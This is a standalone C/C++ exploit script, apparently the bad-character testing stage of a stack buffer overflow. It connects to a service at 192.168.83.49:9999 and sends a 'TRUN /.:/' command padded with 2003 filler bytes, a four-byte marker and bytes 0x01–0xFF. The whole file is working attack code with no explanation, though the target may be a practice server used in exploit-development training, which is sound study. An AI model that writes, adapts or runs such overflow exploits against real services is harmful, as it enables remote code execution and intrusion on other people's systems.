#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

int main() {
    const char* host = "192.168.83.49";
    int port = 9999;
    int offset = 2003;

    const int total_size = offset + 4 + 256;
    char buffer[total_size + 1];

    memset(buffer, 'X', offset);

    memset(buffer + offset, 'Y', 4);

    for (int i = 0; i < 256; ++i) {
        buffer[offset + 4 + i] = static_cast<char>(i + 1);
    }

    buffer[total_size] = '\0';

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return 1;
    }

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, host, &server_addr.sin_addr) <= 0) {
        perror("Invalid address/Address not supported");
        close(sock);
        return 1;
    }

    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection failed");
        close(sock);
        return 1;
    }

    char recvBuffer[1024] = {0};
    if (read(sock, recvBuffer, sizeof(recvBuffer)) > 0) {
        printf("%s\n", recvBuffer);
    }

    printf("Sending Exploit\n");

    char message[total_size + 10];
    snprintf(message, sizeof(message), "TRUN /.:/%s", buffer);
    send(sock, message, strlen(message), 0);

    memset(recvBuffer, 0, sizeof(recvBuffer));
    if (read(sock, recvBuffer, sizeof(recvBuffer)) > 0) {
        printf("%s\n", recvBuffer);
    }

    close(sock);
    return 0;
}
